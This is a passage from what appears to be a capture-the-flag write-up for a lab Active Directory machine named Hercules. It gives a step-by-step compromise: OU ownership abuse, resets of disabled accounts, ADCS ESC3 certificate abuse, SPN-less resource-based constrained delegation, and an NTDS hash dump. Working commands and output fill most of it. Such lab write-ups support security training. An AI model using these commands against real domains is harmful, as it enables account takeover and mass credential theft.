+*Evil-WinRM* PS C:\Users\auditor\Documents&gt;</code></pre><p>Then i can finally get access as this user!</p><p>I first had to generate a krb5 config file and get the TGT for the auditor and export them both</p><h2>Writable objects as <code>auditor</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k get writable        
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
+permission: WRITE
+
+distinguishedName: OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+permission: WRITE
+
+distinguishedName: DC=_msdcs.hercules.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=hercules,DC=htb
+permission: CREATE_CHILD</code></pre><p>This user has interesting permissions on the <code>Forest Migration</code> OU, i should be able to take ownership and grant GenericAll over the OU</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k get object &#39;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&#39;
+
+distinguishedName: OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+dSCorePropagationData: 2026-09-15 20:46:13+00:00
+description: Container for disabled user-object accounts from previous domains/transfers.
+instanceType: 4
+
+...[SNIP]...</code></pre><p>This is a container for deleted objects</p><h2>Taking ownership and granting full control over <code>Forest Migration</code> OU</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k set owner &#39;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&#39; &#39;auditor&#39; 
+[+] Old owner S-1-5-21-1889966460-2597381952-958560702-512 is now replaced by auditor on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb</code></pre><p>This granted ownership</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll &#39;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&#39; &#39;auditor&#39;
+[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb</code></pre><p>I now have GenericAll over the OU</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k get children --target &#39;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&#39;
+
+distinguishedName: CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+distinguishedName: CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+distinguishedName: CN=WINSRV01-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+distinguishedName: CN=WINSRV02-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+distinguishedName: CN=WINSRV03-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+distinguishedName: CN=ENTERPRISE01-8.1,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+distinguishedName: CN=ENTERPRISE02-8.1,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+distinguishedName: CN=Windows Computer Administrators,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+distinguishedName: CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+distinguishedName: CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+distinguishedName: CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb</code></pre><p>These are the child items within this container</p><p>Ill have a look at all the users in bloodhound</p><p><code>fernando.r</code> stands out, he is part of the <code>smartcard operators</code> group, likely pointing me at ADCS</p><h2>Compromising <code>fernando.r</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k remove uac -f ACCOUNTDISABLE &#39;fernando.r&#39;
+[+] [&#39;ACCOUNTDISABLE&#39;] property flags removed from fernando.r&#39;s userAccountControl</code></pre><p>Ill re enable the account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k set password &#39;fernando.r&#39; &#39;Password123!&#39;       
+[+] Password changed successfully!</code></pre><p>Ill change his password so i can use his account to enumerate ADCS</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u fernando.r -p &#39;Password123!&#39; -k --generate-tgt fernando.r
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\fernando.r:Password123! 
+SMB         dc.hercules.htb 445    dc               [+] TGT saved to: fernando.r.ccache
+SMB         dc.hercules.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=fernando.r.ccache
+
+export KRB5CCNAME=fernando.r.ccache</code></pre><p>Ill then get a TGT and export the TGT</p><h2>ADCS</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad find -u &#39;fernando.r@hercules.htb&#39; -k -no-pass -dc-host dc.hercules.htb -dc-ip 10.129.242.196 -target-ip 10.129.242.196 -target dc.hercules.htb -stdout -enabled -vulnerable
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 18 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &#39;CA-HERCULES&#39; via RRP
+[*] Successfully retrieved CA configuration for &#39;CA-HERCULES&#39;
+[*] Checking web enrollment for CA &#39;CA-HERCULES&#39; @ &#39;dc.hercules.htb&#39;
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : CA-HERCULES
+    DNS Name                            : dc.hercules.htb
+    Certificate Subject                 : CN=CA-HERCULES, DC=hercules, DC=htb
+    Certificate Serial Number           : 1DD5F287C078F9924ED52E93ADFA1CCB
+    Certificate Validity Start          : 2024-12-04 01:34:17+00:00
+    Certificate Validity End            : 2034-12-04 01:44:17+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : HERCULES.HTB\Administrators
+      Access Rights
+        ManageCa                        : HERCULES.HTB\Administrators
+                                          HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        ManageCertificates              : HERCULES.HTB\Administrators
+                                          HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Enroll                          : HERCULES.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : MachineEnrollmentAgent
+    Display Name                        : Enrollment Agent (Computer)
+    Certificate Authorities             : CA-HERCULES
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : True
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireDns
+                                          SubjectRequireDnsAsCn
+    Enrollment Flag                     : AutoEnrollment
+    Extended Key Usage                  : Certificate Request Agent
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-12-04T01:44:26+00:00
+    Template Last Modified              : 2024-12-04T01:44:51+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
+                                          HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : HERCULES.HTB\Enterprise Admins
+        Full Control Principals         : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Owner Principals          : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Dacl Principals           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Property Enroll           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
+    [!] Vulnerabilities
+      ESC3                              : Template has Certificate Request Agent EKU set.
+  1
+    Template Name                       : EnrollmentAgentOffline
+    Display Name                        : Exchange Enrollment Agent (Offline request)
+    Certificate Authorities             : CA-HERCULES
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : True
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Certificate Request Agent
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-12-04T01:44:26+00:00
+    Template Last Modified              : 2024-12-04T01:44:51+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
+                                          HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : HERCULES.HTB\Enterprise Admins
+        Full Control Principals         : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Owner Principals          : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Dacl Principals           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Property Enroll           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
+    [!] Vulnerabilities
+      ESC3                              : Template has Certificate Request Agent EKU set.
+      ESC15                             : Enrollee supplies subject and schema version is 1.
+    [*] Remarks
+      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
+  2
+    Template Name                       : EnrollmentAgent
+    Display Name                        : Enrollment Agent
+    Certificate Authorities             : CA-HERCULES
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : True
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : AutoEnrollment
+    Extended Key Usage                  : Certificate Request Agent
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-12-04T01:44:26+00:00
+    Template Last Modified              : 2024-12-04T01:44:51+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
+                                          HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : HERCULES.HTB\Enterprise Admins
+        Full Control Principals         : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Owner Principals          : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Dacl Principals           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Property Enroll           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
+    [!] Vulnerabilities
+      ESC3                              : Template has Certificate Request Agent EKU set.</code></pre><p>Several ADCS vulnerabilities</p><h2>ESC3</h2><p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template" target="_blank" rel="noreferrer">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad req -u &#39;fernando.r@hercules.htn&#39; -k -no-pass -dc-ip &#39;10.129.242.196&#39; -target &#39;dc.hercules.htb&#39; -ca &#39;CA-HERCULES&#39; -template &#39;EnrollmentAgent&#39; -dc-host dc.hercules.htb
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 5
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;fernando.r@hercules.htb&#39;
+[*] Certificate object SID is &#39;S-1-5-21-1889966460-2597381952-958560702-1121&#39;
+[*] Saving certificate and private key to &#39;fernando.r.pfx&#39;
+[*] Wrote certificate and private key to &#39;fernando.r.pfx&#39;</code></pre><p>Ill first request a certificate for the <code>EnrollmentAgent</code> template</p><p>However the second step fails, after some research i believe it is because of an issue with certipy and how it handles requests like this with kerberos</p><p>It repeatedly gives me the error <code>RPC_E_CALL_COMPLETE</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[*] Requesting certificate via RPC
+[*] Request ID is 8
+[-] Got error while requesting certificate: code: 0x80010117 - RPC_E_CALL_COMPLETE - Call context cannot be accessed after call completed.
+Would you like to save the private key? (y/N): n
+[-] Failed to request certificate</code></pre><blockquote><p>The error 0x80010117 - RPC_E_CALL_COMPLETE combined with using the -k (Kerberos authentication) flag is a known bug in Certipy when handling on-behalf-of requests over RPC. When you pass the -k flag, Certipy attempts to negotiate the request context via Kerberos tickets instead of NTLM. However, during the second phase of an ESC3 request, the signature processing logic crashes the RPC context, resulting in the &quot;Call context cannot be accessed after call completed&quot; failure.</p></blockquote><p><a href="https://github.com/ly4k/Certipy/issues/174" target="_blank" rel="noreferrer">https://github.com/ly4k/Certipy/issues/174</a></p><p>And after researching more i find an issue in the certipy wiki and someone recommends using the <code>-dcom</code> option to force DCOM instead of RPC</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad req -u &quot;fernando.r@hercules.htb&quot; -k -no-pass -dc-ip 10.129.58.198 -dc-host dc.hercules.htb -target &quot;dc.hercules.htb&quot; -ca &#39;CA-HERCULES&#39; -template &quot;User&quot; -pfx fernando.r.pfx -on-behalf-of &#39;HERCULES\\Administrator&#39; -dcom 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via DCOM
+[*] Request ID is 7
+[-] Got error while requesting certificate: code: 0x80094009 - CERTSRV_E_RESTRICTEDOFFICER - The operation is denied. It can only be performed by a certificate manager that is allowed to manage certificates for the current requester.
+Would you like to save the private key? (y/N): n</code></pre><p>Using DCOM still fails, this is likely because i cannot request a certificate in behalf of the administrator, i need to target another user with interesting permissions</p><p>So ill do some enumeration on some of the users that have interesting permissions</p><p>Ill choose to target the <code>ashley.b</code> user to start since she likely has some interesting permissions as discovered earlier from the email and the .lnk file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad req -u &quot;fernando.r@hercules.htb&quot; -k -no-pass -dc-ip 10.129.58.200 -dc-host dc.hercules.htb -target &quot;dc.hercules.htb&quot; -ca &#39;CA-HERCULES&#39; -template &quot;User&quot; -pfx fernando.r.pfx -on-behalf-of &#39;HERCULES\ashley.b&#39; -dcom      
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via DCOM
+[*] Request ID is 39
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;ashley.b@hercules.htb&#39;
+[*] Certificate object SID is &#39;S-1-5-21-1889966460-2597381952-958560702-1135&#39;
+[*] Saving certificate and private key to &#39;ashley.b.pfx&#39;
+[*] Wrote certificate and private key to &#39;ashley.b.pfx&#39;</code></pre><p>Then ill request the certificate for this user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.58.200            
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;ashley.b@hercules.htb&#39;
+[*]     Security Extension SID: &#39;S-1-5-21-1889966460-2597381952-958560702-1135&#39;
+[*] Using principal: &#39;ashley.b@hercules.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;ashley.b.ccache&#39;
+[*] Wrote credential cache to &#39;ashley.b.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;ashley.b&#39;
+[*] Got hash for &#39;ashley.b@hercules.htb&#39;: aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2</code></pre><p>I now have the NT hash and the TGT for this user, and i can enumerate her permissions</p><h2>Enumeration as <code>ashley.b</code></h2><p><img src="images/hercules/pasted-image-20260916205427.webp" alt="Screenshot" loading="lazy" /></p><p>She is part of remote management users</p><h2>Access over winrm as <code>ashley.b</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc.hercules.htb -r hercules.htb -S           
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ashley.b\Documents&gt;</code></pre><p>And now if i remember back to the .lnk file it said there was a script in her desktop</p><h2>Compromising <code>IIS_Administrator</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\ashley.b\Desktop&gt; type aCleanup.ps1
+Start-ScheduledTask -TaskName &quot;Password Cleanup&quot;</code></pre><p>Its running under a scheduled task</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\ashley.b\Desktop&gt; (Get-ScheduledTask -TaskName &quot;Password Cleanup&quot;).Actions
+
+
+Id               :
+Arguments        : -File &quot;C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1&quot;
+Execute          : powershell.exe
+WorkingDirectory :
+PSComputerName   :
+
+
+
+*Evil-WinRM* PS C:\Users\ashley.b\Desktop&gt;</code></pre><p>As seen here its running a script in the Administrator directory so i wont be able to see what its doing</p><p>But i think running this script will reset the ACLs of the users</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Hello Ashley,
+
+The issue you are facing is that some members in the Department were once p=
+art of sensitive groups which are blocking your permissions.
+
+I&#39;ve discussed your issue at length with security and here is a solution th=
+at we feel works for both us and your team. I&#39;ve attached a copy of the scr=
+ipt your team should run to your home folder. For convenience, We have prov=
+ided a shortcut to the script in the IT share. You may also run the task ma=
+nually from powershell.
+
+If you have any other issues feel free to inform me.
+
+Regards, Domain Admins.</code></pre><p>She also has an email in her desktop, this says that users who were ever considered sensitive dont inherit permissions like other users do</p><p>This is true, any user thats ever part of a higher privileged group hold the attribute <code>adminCount=1</code> which means when you have full control over an OU any user with that attribute dont inherit the rights</p><p>So maybe running this script will cause this attribute to be cleared since this is a <code>solution</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k set owner &#39;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&#39; &#39;auditor&#39;
+[!] S-1-5-21-1889966460-2597381952-958560702-1128 is already the owner, no modification will be made
+
+bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll &#39;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&#39; &#39;auditor&#39;
+[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll &#39;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&#39; &#39;IT SUPPORT&#39;
+[+] IT SUPPORT has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb</code></pre><p>First ill ensure the <code>auditor</code> account has full control over the OU, then running this script hopefully should clear the ACLs and mean i can access the <code>iis_administrator</code> account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\ashley.b\Desktop&gt; Start-ScheduledTask &quot;Password Cleanup&quot;</code></pre><p>Ill then run the script</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k set password &#39;iis_administrator&#39; &#39;Password123!&#39;
+[+] Password changed successfully!</code></pre><p>I can now change the password of this user!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k remove uac -f ACCOUNTDISABLE &#39;iis_administrator&#39;
+[+] [&#39;ACCOUNTDISABLE&#39;] property flags removed from iis_administrator&#39;s userAccountControl</code></pre><p>I also need to re enable the account!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u iis_administrator -p &#39;Password123!&#39; -k
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\iis_administrator:Password123!</code></pre><p>This user is now compromised!</p><h2>Compromising <code>iis_webserver$</code></h2><p><img src="images/hercules/pasted-image-20260916214039.webp" alt="Screenshot" loading="lazy" /></p><p>I can change the password of this user too</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u iis_administrator -p &#39;Password123!&#39; -k --generate-tgt iisadmin
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\iis_administrator:Password123! 
+SMB         dc.hercules.htb 445    dc               [+] TGT saved to: iisadmin.ccache
+SMB         dc.hercules.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=iisadmin.ccache
+
+export KRB5CCNAME=iisadmin.ccache</code></pre><p>Then ill get a TGT and export it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k set password &#39;iis_webserver$&#39; &#39;Password123!&#39;
+[+] Password changed successfully!</code></pre><p>Then change the password!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u &#39;iis_webserver$&#39; -p &#39;Password123!&#39; -k          
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\iis_webserver$:Password123!</code></pre><p>This user is now compromised!</p><h2>Resource Based Constrained Delegation (SPN-less)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">findDelegation.py hercules.htb/ -k -no-pass -dc-host dc.hercules.htb                   
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+AccountName     AccountType  DelegationType              DelegationRightsTo  SPN Exists 
+--------------  -----------  --------------------------  ------------------  ----------
+iis_webserver$  Person       Resource-Based Constrained  DC$                 No         
+DC$             Computer     Unconstrained               N/A                 Yes </code></pre><p>Looks like there is RBCD!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">getTGT.py -hashes :$(pypykatz crypto nt &#39;Password123!&#39;) &quot;hercules.htb/iis_webserver$&quot;
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in iis_webserver$.ccache</code></pre><p>The first step is to grab the TGT</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">export KRB5CCNAME=iis_webserver\$.ccache</code></pre><p>Then export it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">rbcd.py -delegate-from &#39;iis_webserver$&#39; -delegate-to &#39;DC$&#39; -dc-ip &#39;10.129.58.200&#39; -action &#39;write&#39; &#39;hercules.htb/iis_webserver$&#39; -k -no-pass -dc-host dc.hercules.htb
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Accounts allowed to act on behalf of other identity:
+[*]     iis_webserver$   (S-1-5-21-1889966460-2597381952-958560702-1124)
+[*] iis_webserver$ can already impersonate users on DC$ via S4U2Proxy
+[*] Not modifying the delegation rights.
+[*] Accounts allowed to act on behalf of other identity:
+[*]     iis_webserver$   (S-1-5-21-1889966460-2597381952-958560702-1124)</code></pre><p>Then ill configure the RBCD</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">describeTicket.py iis_webserver\$.ccache | grep &#39;Ticket Session Key&#39; 
+[*] Ticket Session Key            : a9f4d76cdc5ba32d6e0763da9d106eb7</code></pre><p>Ill then pull out the ticket session key from my TGT</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">pypykatz crypto nt &#39;Password123!&#39;
+2b576acbe6bcfda7294d6bd18041b8fe</code></pre><p>Then convert the current password to an NT hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">changepasswd.py -newhashes &#39;:a9f4d76cdc5ba32d6e0763da9d106eb7&#39; -k -hashes &#39;:2b576acbe6bcfda7294d6bd18041b8fe&#39; &#39;hercules.htb/iis_webserver$@dc.hercules.htb&#39;                                
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of hercules.htb\iis_webserver$
+[*] Connecting to DCE/RPC as hercules.htb\iis_webserver$
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).</code></pre><p>Ill then use the NTLM hash and set the session key to the new hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">getST.py -u2u -impersonate &quot;Administrator&quot; -spn &quot;cifs/dc.hercules.htb&quot; -k -no-pass &#39;hercules.htb/iis_webserver$&#39;
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache</code></pre><p>Ill then request the ticket</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">export KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache</code></pre><p>Then export it!</p><h2>Domain Admin</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb --use-kcache --ntds                                              
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\Administrator from ccache (Pwn3d!)
+SMB         dc.hercules.htb 445    dc               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc.hercules.htb 445    dc               Administrator:500:aad3b435b51404eeaad3b435b51404ee:56855ee6b7570edefde6ac262200756e:::
+SMB         dc.hercules.htb 445    dc               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc.hercules.htb 445    dc               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:aa9d05e554420b27186ffe97882303c2:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\jessica.e:1113:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\mikayla.a:1114:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\stephanie.w:1115:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\johanna.f:1116:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\heather.s:1117:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\camilla.b:1118:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\iis_administrator:1119:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\taylor.m:1120:aad3b435b51404eeaad3b435b51404ee:952294bde2537ad3568133085a74d4b2:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\fernando.r:1121:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\james.s:1122:aad3b435b51404eeaad3b435b51404ee:c23578256755003649011ee7c9fef7b2:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\anthony.r:1123:aad3b435b51404eeaad3b435b51404ee:c23578256755003649011ee7c9fef7b2:::
